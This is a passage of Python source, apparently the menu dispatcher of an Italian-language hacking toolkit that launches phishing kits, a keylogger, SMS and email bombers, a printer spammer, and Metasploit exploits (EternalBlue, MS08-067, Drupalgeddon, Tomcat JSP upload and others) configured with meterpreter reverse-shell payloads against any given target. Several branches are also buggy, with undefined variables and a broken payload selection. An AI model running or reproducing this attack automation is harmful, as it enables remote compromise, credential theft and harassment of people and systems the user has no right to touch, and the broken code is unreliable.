        os.system("cd tools/Kautilya/ && ruby kautilya.rb")
        logo_menu()
    elif command == 'debinject':
        os.system("cd tools/Debinject/ && python debinject.py")
        logo_menu()
    elif command == 'armitage':
        print("-# Attendi l'avvio")
        os.system("open armitage")
        return menu()
    elif command == 'setoolkit' or command == 'set' or command == 's.e.t':
        os.system("setoolkit")
        logo_menu()
    elif command == 'fatrat' or command == 'thefatrat':
        os.system("fatrat")
        logo_menu()
    elif command == 'eggshell':
        os.system("reset")
        os.system("cd tools/EggShell/ && python eggshell.py")
        logo_menu()
    elif command == 'shellsploit':
        os.system("shellsploit")
        logo_menu()
    elif command == 'beelogger':
        os.system("cd tools/BeeLogger/ && python bee.py")
        logo_menu()
    elif command == 'saint':
        os.system("cd tools/sAINT/ && java -jar sAINT.jar")
        logo_menu()
    elif command == 'brutal':
        os.system("./tools/Brutal/Brutal.sh")
        logo_menu()
    elif command == 'astroid':
        os.system("cd tools/astroid/ && ./astroid.sh")
        logo_menu()
    elif command == 'weeman':
        os.system("reset")
        os.system("cd tools/weeman/ && python weeman.py")
        logo_menu()
    elif command == 'u3pwn':
        os.system("u3-pwn")
        return menu()
    elif command == 'koadic':
        os.system("cd tools/koadic/ && ./koadic")
        logo_menu()
    elif command == 'pentestly':
        os.system("cd tools/pentestly/ && ./pentestly")
        logo_menu()
    elif command == 'l0l':
        os.system("cd tools/l0l/ && ./l0l")
        logo_menu()
    elif command == 'termineter':
        os.system("termineter")
        logo_menu()
    elif command == 'kayak':
        print("-# Attendi l'avvio")
        os.system("open kayak")
        return menu()
    elif command == 'pybomber':
        print("")
        os.system("cd tools/pybomber/ && python smsbomber.py")
        return menu()
    elif command == 'ciscoge':
        if option:
            checkwords = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O",
            "P","Q","R","S","T","U","V","W","X","Y","Z","a","b","c","d","e","f","g",
            "h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
            for words in option:
                if words in checkwords or len(option) < 7 or "." not in option:
                    print("-# (%s-%s) Indirizzo IP non valido"%(red,end))
                    return menu()
            if argument:
                try:
                    if int(argument):
                        pass
                except ValueError:
                    print("-# (%s-%s) Metodo di attacco non valido"%(red,end))
                    return menu()
                methods = ["1","2","3","4","5","6","7","8","9","10","11","12","13","14"]
                if argument not in methods:
                    print("-# (%s-%s) Metodo di attacco non valido"%(red,end))
                    return menu()
                print("")
                os.system("cd tools/cisco-global-exploiter/ && perl cge.pl %s %s"%(option,argument))
                print("")
                return menu()
            else:
                os.system("cd tools/cisco-global-exploiter/ && perl cge.pl")
                print("\n-# (%s-%s) Metodo di attacco richiesto (1-14)"%(red,end))
                return menu()
        else:
            os.system("cd tools/cisco-global-exploiter/ && perl cge.pl")
            print("\n-# Exploiter locale per sistemi cisco")
            print("-# Uso: $ ciscoge <indirizzo IP> <metodo (1-14)>\n")
            return menu()
    elif command == 'yersinia':
        print("-# Premi 'q' per chiudere la finestra di yersinia")
        os.system("gnome-terminal --geometry=80x25 -- yersinia -I")
        os.system("xterm -e 'rm yersinia.log'")
        return menu()
    elif command == 'wole':
        if option:
            if option == 'sniff':
                try:
                    command = "gnome-terminal -- wol-e -s -i %s"%(netifaces.gateways()['default'][netifaces.AF_INET][1])
                except KeyError:
                    print("-# (%s-%s) Nessuna connessione"%(red,end))
                    return menu()
            elif option == 'wakeup': command = "wol-e -fa"
            elif option == 'detect_apple_mac': command = "wol-e -f"
            else:
                print("-# (%s-%s) Modulo non valido"%(red,end))
                return menu()
            os.system(command)
        else:
            print("\n-# Wake on LAN Explorer, ")
            print("-# Uso: $ wole <sniff/detect_apple_mac/wakeup>\n")
        return menu()
    elif command == 'responder':
        try:
            os.system("responder -wrfdbv -P -I %s"%(netifaces.gateways()['default'][netifaces.AF_INET][1]))
            print("")
        except Exception as e:
            print("-# (%s-%s) Nessuna connessione"%(red,end))
        return menu()
    elif command == 'xspy':
        os.system("gnome-terminal -- xspy")
        return menu()
    elif command == "eflood":
        print("\n-# Email Spammer\n")
        os.system("cd tools/Eflood/ && python eflood.py")
        return menu()
    elif command == "microsploit":
        os.system("cd tools/Microsploit/ && ./Microsploit")
        logo_menu()
    elif command == "darksploit":
        os.system("cd tools/DarkSploit/ && python DrXp.py")
        logo_menu()
    elif command == "onelin3r":
        os.system("cd tools/One-Lin3r/ && python One_Lin3r.py")
        logo_menu()
    elif command == "jboss":
        if option:
            modules = ["win","linux"]
            if option not in modules:
                print("-# (%s-%s) Modulo non valido"%(red,end))
                return menu()
            if argument:
                checkwords = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O",
                "P","Q","R","S","T","U","V","W","X","Y","Z","a","b","c","d","e","f","g",
                "h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
                for words in argument:
                    if words in checkwords or len(argument) < 7 or "." not in argument:
                        print("-# (%s-%s) Indirizzo IP non valido"%(red,end))
                        return menu()
                print("")
                os.system("jboss-%s %s 8080 2>/dev/null"%(option, argument))
                print("")
            else:
                print("-# (%s-%s) Indirizzo IP richiesto"%(red,end))
        else:
            print("\n-# Prendi il controllo di un intero server (e altro) con la vulnerabilitÃ  JBoss")
            print("-# Uso: $ jboss <win/linux> <target IP>\n")
        return menu()
    elif command == 'hakkuf' or command == 'hakku':
        os.system("reset")
        os.system("cd tools/hakkuframework/ && ./hakku")
        logo_menu()
    elif command == 'penbox':
        os.system("cd tools/PenBox/ && python penbox.py")
        logo_menu()
    elif command == 'simple-ducky':
        os.system("simple-ducky")
        logo_menu()
    elif command == 'discover':
        os.system("cd tools/discover/ && ./discover.sh")
        logo_menu()
    elif command == 'zarp':
        os.system("cd tools/zarp/ && python zarp.py")
        logo_menu()
    elif command == 'sb0x':
        os.system("cd tools/sb0x-project/ && python sb0x.py")
        logo_menu()
    elif command == 'atscan':
        os.system("cd tools/ATSCAN/ && perl atscan.pl --interactive")
        logo_menu()
    elif command == 'inguma':
        print("")
        os.chdir("tools/inguma/")
        os.system("python inguma.py")
        os.chdir("../../")
        logo_menu()
    elif command == 'websploit':
        os.system("reset")
        os.system("cd tools/websploit/ && ./websploit")
        logo_menu()
    elif command == "trity":
        os.system("trity")
        logo_menu()
    elif command == "socialfish":
        os.system("cd tools/SocialFish/ && python SocialFish.py")
        print("\n\n-# Sei stato riportato al menu")
        return menu()
    elif command == 'printerspam':
        if option: # target
            checkwords = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O",
            "P","Q","R","S","T","U","V","W","X","Y","Z","a","b","c","d","e","f","g",
            "h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
            for words in option:
                if words in checkwords:
                    print("-# (%s-%s) Indirizzo IP non valido"%(red,end))
                    return menu()
            if len(option) < 7 or "." not in option:
                print("-# (%s-%s) Indirizzo IP non valido"%(red,end))
                return menu()
            if argument: # message
                mode = 1
                if argument2:
                    if argument2 == "slow":
                        mode = 3
                    elif argument2 == "fast":
                        mode = .4
                    elif argument2 == "normal":
                        pass
                    elif argument2 == "ultra":
                        mode = .01
                    else:
                        print("-# (%s-%s) Spamming Mode non valida"%(red,end))
                        return menu()
                rc_num = 0
                if argument2 == None:
                    argument2 = "normal"
                print("")
                print("(%s+%s) Spamming Avviato > %s"%(bright_green,end, argument2))
                print("(%s*%s) Stampante: %s"%(bright_yellow,end,option))
                print("(%s*%s) Messaggio: %s"%(bright_yellow,end,argument))
                print("")
                print("-# Ctrl + C per fermare")
                print("")
                while True:
                    try:
                        sys.stdout.write("\r" + "(%s*%s) Richieste inviate: %s"%(bright_yellow,end,rc_num) + " ")
                        sys.stdout.flush()
                        os.system("yes %s | nc -q 0 %s 9100"%(argument,option))
                        time.sleep(mode)
                        rc_num += 1
                    except (KeyboardInterrupt,EOFError):
                        print("\n-# (%s-%s) Spamming Interrotto"%(red,end))
            else:
                print("-# (%s-%s) Messaggio richiesto"%(red,end))
        else:
            print("")
            print("-# Fai spammare una stampante, essa deve avere la porta 9100 aperta")
            print("")
            print("-# %sSpam Mode%s:"%(bright_green,end))
            print("-# slow / normal (default) / fast / ultra")
            print("")
            print("-# Uso: $ printerspam <printer ip> <message to spam> [spam mode]")
            print("")
        return menu()
    elif command == 'httrack':
        if option:
            os.system("gnome-terminal -- httrack %s -O output/httrack/%s/"%(option, option))
            print("-# Dati salvati in %soutput/httrack/%s/%s"%(blue,option,end))
        else:
            print("\n-# Site Cloner")
            print("-# Uso: $ httrack <indirizzo>\n")
        return menu()
    elif command == 'metagoofil':
        file_types = ["pdf","doc","xls","ppt","odp","ods","docx","xlsx","pptx"]
        if option:
            if "." not in option or "www." in option or "http://" in option or "https://" in option:
                print("-# (%s-%s) Indirizzo non valido"%(red,end))
                return menu()
            if argument:
                if argument not in file_types:
                    print("-# (%s-%s) Formato non valido"%(red,end))
                    return menu()
                os.system("metagoofil -d %s -t %s -o output/MetaGF/ -f metagf.html"%(option, argument))
                print("-# File salvati in %soutput/MetaGF/metagf.html%s (se scaricati)"%(blue,end))
                print("")
            else:
                print("-# (%s-%s) Tipo di file richiesto"%(red,end))
        else:
            print("\n-# Scarica file da un sito\n")
            print("-# %sFileTypes%s:"%(bright_green,end))
            print("-# pdf / doc / xls / ppt / odp / ods / docx / xlsx / pptx\n")
            print("-# %sAttenzione%s:"%(bright_yellow,end))
            print(" Per scaricare molteplici file digita i 'FileTypes' nel seguente modo:")
            print(" pdf,doc,xls,...")
            print("\n-# Uso: $ metagoofil <domain (example.com)> <filetype da scaricare>\n")
        return menu()
    elif command == "lynis":
        print("")
        os.system("lynis audit system")
        print("")
        return menu()
    elif command == 'searchsploit':
        if option:
            print("")
            os.system(command_input)
            print("")
        else:
            print("\n-# Cerca un exploit tramite un parametro di ricerca")
            print("-# Uso: $ searchsploit <parametro di ricerca>\n")
        return menu()
    elif command == 'ngrok':
        if option:
            ngrok_srvc_list = ["tcp","http","tsl"]
            if option not in ngrok_srvc_list:
                print("-# (%s-%s) Modulo non valido"%(red,end))
                return menu()
            if argument:
                try:
                    if int(argument) < 1 or int(argument) > 65535:
                        print("-# (%s-%s) Porta non valida"%(red,end))
                        return menu()
                except ValueError:
                    print("-# (%s-%s) Porta non valida"%(red,end))
                    return menu()
                os.system("gnome-terminal -- ngrok %s %s"%(option, argument))
            else:
                print("-# (%s-%s) Porta richiesta"%(red,end))
        else:
            print("\n-# Senza aprire le porte del router, ngrok consente le connessione WAN")
            print("-# Uso: $ ngrok <tcp/http/tsl> <port>\n")
        return menu()
    elif command == "angryip":
        print("-# Attendi l'avvio")
        os.system("open ipscan")
        return menu()
    elif command == "zmap":
        if option:
            try:
                if int(option) < 1 or int(option) > 65535:
                    print("-# (%s-%s) Porta non valida"%(red,end))
                    return menu()
            except ValueError:
                print("-# (%s-%s) Porta non valida"%(red,end))
                return menu()
            command = "zmap -p %s -q"%(option)
            if argument:
                command = "zmap -p %s %s -q"%(option, argument)
            print("")
            os.system(command)
            print("\n")
        else:
            print("\n-# Cerca indirizzi IP disponibili sulla porta specificata")
            print("-# Uso: $ zmap <porta> [IP-range (x.x.x.x/x)]\n")
        return menu()
    elif command == "v3n0m":
        os.system("cd tools/V3n0M-Scanner/src/ && python3 v3n0m.py")
        logo_menu()
    elif command == "wascan":
        if option:
            if "http://" not in option:
                if "https://" in option:
                    pass
                else:
                    option = "http://"+option
            os.system("cd tools/WAScan/ && python wascan.py --url %s -s 5"%(option))
            print("")
        else:
            print("\n-# Multi-Scanner per alcuni tipi di vulnerabilitÃ ")
            print("-# Uso: $ wascan <indirizzo>\n")
        return menu()
    elif command == "wapiti":
        if option:
            if "http://" not in option:
                if "https://" in option:
                    pass
                else:
                    option = "http://"+option
            print("")
            os.system("wapiti %s -u --verify-ssl 1 -v 1 --output output/Wapiti"%(option))
            if os.path.isfile("output/Wapiti/index.html"):
                print("\n-# Apro la pagina di analisi, solo un momento...\n")
                os.system("open firefox %s/output/Wapiti/index.html"%(os.getcwd()))
            print("")
        else:
            print("\n-# Multi-Scanner per XSS, SQLi, BlindSQL, ecc...")
            print("-# Uso: $ wapiti <indirizzo>\n")
        return menu()
    elif command == "rkhunter":
        print("")
        os.system("rkhunter --check")
        print("\n")
        return menu()
    elif command == "serenity":
        if option:
            if "http://" not in option:
                if "https://" in option:
                    pass
                else:
                    option = "http://"+option
            os.system("cd tools/53R3N17Y/ && ./serenity --all %s"%(option))
            print("")
        else:
            print("\n-# Estrae link e molteplici informazioni da un indirizzo")
            print("-# Uso: $ serenity <indirizzo>\n")
        return menu()
    elif command == "leviathan":
        os.system("cd tools/leviathan/ && python leviathan.py")
        logo_menu()
    elif command == "cmospwd":
        print("")
        os.system("cmospwd /d")
        print("")
        return menu()
    elif command == "pastezort":
        os.system("cd tools/PasteZort/ && python PasteZ0rt.py")
        print("")
        print("-# Sei stato riportato al menu")
        return menu()
    elif command == "wig":
        if option:
            os.system("cd tools/wig/ && python3 wig.py %s -u -a -m -v"%(option))
            print("")
        else:
            print("\n-# Cerca informazioni inerenti al server, sottodomini (subdomains), ecc...")
            print("-# Uso: $ wig <indirizzo>\n")
        return menu()
    elif command == "webpwn3r":
        os.system("cd tools/webpwn3r/ && python scan.py")
        print("")
        return menu()
    elif command == "dymerge":
        if option:
            if argument:
                if "--output" not in command_input:
                    print("-# (%s-%s) Opzione '--output' richiesta"%(red,end))
                    return menu()
                out = []
                output = command_input.split("--output")[1]
                out.append(output)
                wd = command_input.replace("dymerge","")
                wd = wd.replace("--output","")
                wd = wd.replace(out[0],"")
                if out[0] == "":
                    print("-# (%s-%s) File di output richiesto"%(red,end))
                    return menu()
                for e in wd.split():
                    if "/" not in e:
                        print("-# (%s-%s) Inserisci la directory completa per '%s'"%(red,end, e))
                        return menu()
                    if not os.path.isfile(e):
                        print("-# (%s-%s) File '%s' non trovato"%(red,end, e))
                        return menu()
                if ".txt" not in out[0]:
                    out[0] = out[0]+".txt"
                os.system("cd tools/dymerge/ && python dymerge.py %s -r -s -u -o %s && mv %s ../../output"%(wd, out[0], out[0]))
                print("-# Wordlist salvata in %soutput/%s%s"%(blue,out[0],end))
            else:
                print("-# (%s-%s) Wordlist aggiuntiva richiesta"%(red,end))
        else:
            print("\n-# Unisci 2 o piÃ¹ wordlists in un unico file")
            print("-# Uso: $ dymerge /full/path/wordlist1 /full/path/wordlist2 [...] --output <output.txt>\n")
        return menu()
    elif command == "0trace":
        if option:
            try:
                iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
            except KeyError:
                print("-# (%s-%s) Nessuna connessione"%(red,end))
                return menu()
            print("")
            os.system("0trace.sh %s %s"%(iface, option))
            print("")
        else:
            print("\n-# Traccia gli indirizzi IP connessi all'indirizzo in questione")
            print("-# Uso: $ 0trace <indirizzo>\n")
        return menu()
    elif command == "clusterd":
        if option:
            if "http://" in option:
                option = option.replace("http://","")
            if "https://" in option:
                option = option.replace("https://","")
            os.system("clusterd -i %s --fingerprint --random-agent"%(option))
            print("")
        else:
            print("\n-# Cerca vulnerabilitÃ  in jboss, coldfusion, weblogic, tomcat, railo, axis2 e glassfish")
            print("-# Uso: $ clusterd <indirizzo>\n")
        return menu()
    elif command == "xprobe":
        if option:
            print("")
            os.system("xprobe2 -r %s"%(option))
            print("\n")
        else:
            print("\n-# Scopri che sistema operativo utilizza l'indirizzo in questione")
            print("-# Uso: $ xprobe <indirizzo>\n")
        return menu()
    elif command == "intersect":
        os.system("intersect")
        logo_menu()
    elif command == "ophcrack":
        print("-# Attendi l'avvio")
        os.system("open ophcrack")
        return menu()
    elif command == "parat":
        os.system("cd tools/Parat/ && python main.py")
        logo_menu()
    elif command == "netool":
        os.system("clear")
        os.system("cd tools/netool-toolkit/ && ./netool.sh")
        logo_menu()
    elif command == "cupp":
        print("\n-# Wordlist Generator")
        os.system("cd tools/cupp/ && python cupp.py -i")
        if os.path.exists("output/cupp") == False:
            os.system("mkdir output/cupp")
        os.system("xterm -e 'mv tools/cupp/*.txt output/cupp'")
        print("\n-# Se creata, wordlist salvata in %soutput/cupp/%s\n"%(blue,end))
        return menu()
    elif command == "oscanner":
        if option:
            if "http://" in option:
                option = option.replace("http://","")
            if "https://" in option:
                option = option.replace("https://","")
            print("")
            os.system("oscanner -s %s -v"%(option))
            print("")
        else:
            print("\n-# Oracle Scanner, enumeratore di informazioni (Porta 1040)")
            print("-# Uso: $ oscanner <indirizzo>\n")
        return menu()
    elif command == "portscan":
        if option:
            ip = option
            portscan(ip)
        else:
            print("\n-# Scansiona le piÃ¹ comuni porte aperte")
            print("-# Uso: $ portscan <indirizzo>\n")
        return menu()

    ##### EXPLOITS #####
    elif command == "eternalblue":
        if option:
            target = option
            lhost = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
            if "http://" in target or "https://" in target:
                replacer(target)
                get_ip(target)
            check_conn()
            echo = """use exploit/windows/smb/ms17_010_eternalblue
            set payload windows/x64/meterpreter/reverse_tcp
            set LHOST %s
            set RHOST %s
            run
            exit
            """%(lhost,target)
            os.system("echo '%s' > fs_eternalblue.rc"%(echo))
            os.system("msfconsole -r fs_eternalblue.rc")
            os.system("rm fs_eternalblue.rc")
            print("\n-# Completato\n")
        else:
            print("-# Uso: $ eternalblue <target>")
        return menu()
    elif command == "eternalromance":
        if option:
            target = option
            lhost = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
            if "http://" in target or "https://" in target:
                replacer(target)
                get_ip(target)
            check_conn()
            echo = """use exploit/windows/smb/ms17_010_psexec
            set payload windows/meterpreter/reverse_tcp
            set LHOST %s
            set RHOST %s
            run
            exit
            """%(lhost,target)
            os.system("echo '%s' > fs_eternalromance.rc"%(echo))
            os.system("msfconsole -r fs_eternalromance.rc")
            os.system("rm fs_eternalromance.rc")
            print("\n-# Completato\n")
        else:
            print("-# Uso: $ eternalromance <target>")
        return menu()
    elif command == "handler":
        if option:
            lhost = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
            lport = 4444
            if option == "windows": payload = "windows/meterpreter/reverse_tcp"
            if option == "android": payload = "android/meterpreter/reverse_tcp"
            if option == "osx": payload = "osx/x64/meterpreter/reverse_tcp"
            if option == "linux": payload = "linux/x64/meterpreter/reverse_tcp"
            else:
                print("-# (%s-%s) Payload non valida"%(red,end))
                return menu()
            check_conn()
            echo = """use exploit/multi/handler
            set payload %s
            set lhost %s
            set lport %s
            run
            exit
            """%(payload,lhost,lport)
            print("")
            os.system("echo '%s' > fs_handler.rc"%(echo))
            os.system("msfconsole -r fs_handler.rc")
            os.system("rm fs_handler.rc")
            print("\n-# Completato\n")
        else:
            print("-# Uso: $ handler <android/linux/windows/osx>")
        return menu()
    elif command == "webview":
        check_conn()
        lhost = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
        srvhost = lhost
        srvport = 8080
        echo = """use android/browser/webview_addjavascriptinterface
        set LHOST %s
        set LPORT 4444
        set SRVHOST %s
        set SRVPORT %s
        run
        """%(lhost,lport,srvhost,srvport)
        os.system("echo '%s' > fs_webview.rc"%(echo))
        os.system("msfconsole -r fs_webview.rc")
        os.system("rm fs_webview.rc")
        print("\n-# Completato\n")
        return menu()
    elif command == "samba_pipename":
        if option:
            check_conn()
            target = option
            if "http://" in target or "https://" in target:
                replacer(target)
                get_ip(target)
            echo = """use exploit/linux/samba/is_known_pipename
            set RHOST %s
            run
            exit
            """%(target)
            os.system("echo '%s' > fs_samba_pipename.rc"%(echo))
            os.system("msfconsole -r fs_samba_pipename.rc")
            os.system("rm fs_samba_pipename.rc")
            print("\n-# Completato\n")
        else:
            print("-# Uso: $ samba_pipename <target>")
        return menu()
    elif command == "samba_usermap":
        if option:
            check_conn()
            target = option
            if "http://" in target or "https://" in target:
                replacer(target)
                get_ip(target)
            echo = """use exploit/multi/samba/usermap_script
            set RHOST %s
            set RPORT 445
            run
            exit
            """%(target)
            os.system("echo '%s' > fs_samba_usermap.rc"%(echo))
            os.system("msfconsole -r fs_samba_usermap.rc")
            os.system("rm fs_samba_usermap.rc")
            print("\n-# Completato\n")
        else:
            print("-# Uso: $ samba_usermap <target>")
        return menu()
    elif command == "shellshock":
        if option:
            target = option
            port = 80
            if "http://" in target or "https://" in target:
                replacer(target)
            if argument:
                port = argument
                check_port(port)
            check_conn()
            os.system("cd exploits/shocker/ && python shocker.py -H %s --port %s"%(target, port))
            print("\n-# Completato\n")
        else:
            print("-# Uso: $ shellshock <target> [port (default: 80)]")
        return menu()
    elif command == "webdav":
        if option:
            target = option
            port = 80
            if argument:
                port = argument
                check_port(port)
            check_conn()
            if "http://" in target or "https://" in target:
                replacer(target)
            echo = """use exploit/windows/iis/cve-2017-7269
            set RHOST %s
            set RPORT %s
            run
            exit
            """%(target,port)
            os.system("echo '%s' > fs_webdav.rc"%(echo))
            os.system("msfconsole -r fs_webdav.rc")
            os.system("rm fs_webdav.rc")
            print("\n-# Completato\n")
        else:
            print("-# Uso: $ webdav <target> [port (default: 80)]")
        return menu()
    elif command == "drupalgeddon":
        if option:
            check_conn()
            target = option
            if "http://" not in target:
                if "https://" in target:
                    pass
                else:
                    target = "http://"+target
            print("")
            os.system("cd exploits/Drupalgeddon2/ && ruby drupalgeddon2.rb %s"%(target))
            print("\n-# Completato\n")
        else:
            print("-# Uso: $ drupalgeddon <target>")
        return menu()
    elif command == "bluesnarfer":
        if option:
            if argument:
                iface = argument
                def start_iface(iface):
                    print("(%s+%s) Attivo interfaccia %s"%(bright_green,end, iface))
                    os.system("rfkill unblock all && hciconfig %s up"%(iface))
                def stop_iface(iface):
                    print("(%s+%s) Fermo interfaccia %s"%(bright_green,end, iface))
                    os.system("rfkill unblock all && hciconfig %s down"%(iface))
                    print("\n-# Completato\n")
                    return menu()
                if option == "scan":
                    print("\n-# Se nessun dispositivo appare a schermo, la scansione ha esito negativo")
                    start_iface(iface)
                    print("(%s+%s) Avvio scansione"%(bright_green,end))
                    print("")
                    os.system("hcitool scan")
                    print("")
                    stop_iface(iface)
                    return menu()
                start_iface(iface)
                print("(%s+%s) Avvio attacco"%(bright_green,end))
                print("")
                os.system("bluesnarfer -r 1-100 -b %s"%(btmac))
                stop_iface(iface)
            else:
                print("-# (%s-%s) Interfaccia bluetooth richiesta"%(red,end))
        else:
            print("-# Uso: $ bluesnarfer <scan/target_mac> <hciX>")
        return menu()
    elif command == "esteemaudit":
        if option:
            if argument:
                target = option
                system = argument
                system_list = ["0","1","2","3","4","5","6","7","8","9"]
                if system not in system_list:
                    print("-# (%s-%s) System-ID non valido"%(red,end))
                    return menu()
                lhost = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
                if "http://" in target or "https://" in target:
                    replacer(target)
                    get_ip(target)
                check_conn()
                getdir = os.getcwd()
                echo = """use exploit/windows/rdp/esteemaudit
                set payload windows/meterpreter/reverse_tcp
                set LHOST %s
                set RHOST %s
                set ESTEEMAUDITPATH %s/exploits/Esteemaudit-Metasploit
                set TARGET %s
                run
                exit
                """%(lhost,target,getdir,system)
                os.system("echo '%s' > fs_esteemaudit.rc"%(echo))
                os.system("msfconsole -r fs_esteemaudit.rc")
                os.system("rm fs_esteemaudit.rc")
                print("\n-# Completato\n")
            else:
                print("-# Uso: $ esteemaudit <target> <system_id>")
        else:
            print("")
            print("-# %sSystems%s:                         "%(bright_green+underline,end))
            print("-# %sID%s:      %sDescrizione%s:        "%(bright_green,end, bright_green,end))
            print("-#  0       Windows XP SP0              ")
            print("-#  1       Windows XP SP1              ")
            print("-#  2       Windows XP SP0 or SP1       ")
            print("-#  3       Windows XP SP2              ")
            print("-#  4       Windows XP SP3              ")
            print("-#  5       Windows XP SP2 or SP3       ")
            print("-#  6       Windows 2003 SP0            ")
            print("-#  7       Windows 2003 SP1            ")
            print("-#  8       Windows 2003 SP2            ")
            print("-#  9       Windows 2003 SP1 or SP2     ")
            print("")
            print("-# Uso: $ esteemaudit <target> <system_id>")
            print("")
        return menu()
    elif command == 'jexboss':
        if option:
            os.system("cd exploits/jexboss/ && python jexboss.py -u %s"%(option))
            print("")
        else:
            print("\n-# Jexboss Ã¨ in grado di scansionare e sfruttare le seguenti vulnerabilitÃ :")
            print("-# admin-console / Struts2 / Jenkins / web-console / jmx-console")
            print("   Servlet Deserialization / Application Deserialization / JMXInvokerServlet")
            print("")
            print("-# Uso: $ jexboss <indirizzo [IP]>\n")
        return menu()
    elif command == "netapi":
        if option:
            target = option
            if "http://" in target or "https://" in target:
                replacer(target)
                get_ip(target)
            check_conn()
            echo = """use windows/smb/ms08_067_netapi
            set RHOST %s
            set RPORT 445
            run
            exit
            """%(target)
            os.system("echo '%s' > fs_netapi.rc"%(echo))
            os.system("msfconsole -r fs_netapi.rc")
            os.system("rm fs_netapi.rc")
            print("\n-# Completato\n")
        else:
            print("-# Uso: $ netapi <target>")
        return menu()
    elif command == "manageengine":
        if option:
            target = option
            lhost = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
            if "http://" in target or "https://" in target:
                replacer(target)
                get_ip(target)
            check_conn()
            echo = """use exploit/windows/http/manageengine_appmanager_exec
            set payload windows/meterpreter/reverse_tcp
            set LHOST %s
            set RHOST %s
            run
            exit
            """%(lhost,target)
            os.system("echo '%s' > fs_manageengine.rc"%(echo))
            os.system("msfconsole -r fs_manageengine.rc")
            os.system("rm fs_manageengine.rc")
            print("\n-# Completato\n")
        else:
            print("-# Uso: $ manageengine <target>")
        return menu()
    elif command == "joomla_comfields":
        if option:
            target = option
            if "http://" in target or "https://" in target:
                replacer(target)
                get_ip(target)
            check_conn()
            echo = """use exploit/unix/webapp/joomla_comfields_sqli_rce
            set RHOST %s
            run
            exit
            """%(target)
            os.system("echo '%s' > fs_joomla_comfields.rc"%(echo))
            os.system("msfconsole -r fs_joomla_comfields.rc")
            os.system("rm fs_joomla_comfields.rc")
            print("\n-# Completato\n")
        else:
            print("-# Uso: $ joomla_comfields <target>")
        return menu()
    elif command == "tomcat_jsp":
        if option:
            target = option
            if "http://" in target or "https://" in target:
                replacer(target)
                get_ip(target)
            check_conn()
            echo = """use exploit/multi/http/tomcat_jsp_upload_bypass
            set payload java/jsp_shell_bind_tcp
            set RHOST %s
            run
            exit
            """%(target)
            os.system("echo '%s' > fs_tomcat_jsp.rc"%(echo))
            os.system("msfconsole -r fs_tomcat_jsp.rc")
            os.system("rm fs_tomcat_jsp.rc")
            print("\n-# Completato\n")
        else:
            print("-# Uso: $ tomcat_jsp <target>")
        return menu()
    elif command == "knox_smdm":
        check_conn()
        lhost = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
        echo = """use exploit/android/browser/samsung_knox_smdm_url
        set payload android/meterpreter/reverse_tcp
        set SRVHOST %s
        set LHOST %s
        run
        """%(lhost,lhost)
        print("")
        os.system("echo '%s' > fs_knox_smdm.rc"%(echo))
        os.system("msfconsole -r fs_knox_smdm.rc")
        os.system("rm fs_knox_smdm.rc")
        print("\n-# Completato\n")
        return menu()
    elif command == "unauth_rce":
        if option:
            target = option
            lhost = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
            if "http://" in target or "https://" in target:
                replacer(target)
                get_ip(target)
            check_conn()
            echo = """use exploit/windows/misc/hp_imc_dbman_restartdb_unauth_rce
            set payload windows/meterpreter/reverse_tcp
            set LHOST %s
            set RHOST %s
            run
            exit
            """%(lhost,target)
            os.system("echo '%s' > fs_unauth_rce.rc"%(echo))
            os.system("msfconsole -r fs_unauth_rce.rc")
            os.system("rm fs_unauth_rce.rc")
            print("\n-# Completato\n")
        else:
            print("-# Uso: $ unauth_rce <target>")
        return menu()

    ### FINAL
    if command == None:
        print("-# %shelp%s per i comandi"%(blue,end))
        return menu()
    else:
        rdm_err = [
        "-# (%s-%s) Comando non valido"%(red,end),
        "-# (%s-%s) Richiesta non valida - %shelp%s per i comandi"%(red,end, blue,end),
        "-# (%s-%s) Non conosco '%s' - %shelp%s per i comandi"%(red,end, command_input, blue,end),
        "-# (%s-%s) Non capisco..."%(red,end),
        "-# (%s-%s) Giusto... o forse no? - %shelp%s per i comandi"%(red,end, blue,end),
        "-# (%s-%s) You clearly need %shelp%s..."%(red,end, blue,end)
        ]
